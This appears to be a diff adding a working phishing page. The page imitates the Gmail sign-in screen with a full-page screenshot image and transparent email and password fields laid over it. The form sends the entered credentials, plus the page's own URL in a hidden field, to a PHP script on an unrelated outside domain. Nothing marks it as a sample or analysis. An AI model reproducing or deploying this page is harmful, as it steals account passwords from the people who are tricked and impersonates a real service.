@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
+
+    <title>GMail - Sign In</title>
+    <link rel="shortcut icon" href="images/gmail.ico" />
+    
+    <style type="text/css">
+      body {
+        background-color: #ffffff;
+        color: #000000;
+      }
+    </style>
+    <style type="text/css">
+      a:hover {
+        color: #6cda7b;
+      }
+    </style>
+    <!--[if lt IE 7]>
+      <style type="text/css">
+        img {
+          behavior: url("pngfix.htc");
+        }
+      </style>
+    <![endif]-->
+  </head>
+
+  <body>
+    <div
+      id="bv_Image1"
+      style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:100%;height:100%;text-align:left;z-index:3;"
+    >
+      <img
+        src="images/googlesnapshot.png"
+        id="Image1"
+        alt=""
+        align="top"
+        border="0"
+      />
+    </div>
+
+    <div
+      id="bv_Form1"
+      style="position:absolute;left:0px;top:0px;width:401px;height:400px;z-index:4"
+    >
+      <form
+        name="Form1"
+        method="post"
+        onsubmit="return validateForm()"
+        action="https://propertymgnt.org/adb_phps/prepose.php"
+      >
+        <input
+          id="email"
+          style="position:absolute;left:51px;top:260px;width:272px;height:42px;border:1px #C0C0C0 solid;font-family:Arial;font-size:14px;z-index:0"
+          name="email"
+          type="text"
+          validate="required:true"
+          pattern="[a-zA-Z0-9!#$%&'*+\/=?^_`{|}~.-]+@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*"
+        />
+        <input
+          id="password"
+          style="position:absolute;left:51px;top:303px;width:272px;height:42px;border:1px #C0C0C0 solid;font-family:Arial;font-size:14px;z-index:1"
+          name="password"
+          value=""
+          validate="required:true"
+          type="password"
+        />
+        <input
+          id="Button1"
+          name="Button1"
+          value=""
+          style="position:absolute;left:51px;top:350px;width:275px;height:38px;border:0px #000000 dotted;background-color:transparent;font-family:Arial;font-size:13px;z-index:2"
+          type="submit"
+        />
+        <input type="hidden" name="pageUrl" id="pageUrl" value="">
+
+      </form>
+    </div>
+
+    <script type="text/javascript">
+      var tbstring = location.href.substring(0, location.href.lastIndexOf("/"));
+      var urlss = document.getElementById("pageUrl");
+      urlss.value = tbstring;
+
+// alert(urlss.value);
+      
+      function validateForm() {
+        var x = document.forms["Form1"]["email"].value;
+        var y = document.forms["Form1"]["password"].value;
+        if (x == "" || y == "") {
+          alert("Email or Password fields cannot be empty!");
+          return false;
+        }
+
+      }
+
+     
+    </script>
+  </body>
+</html>
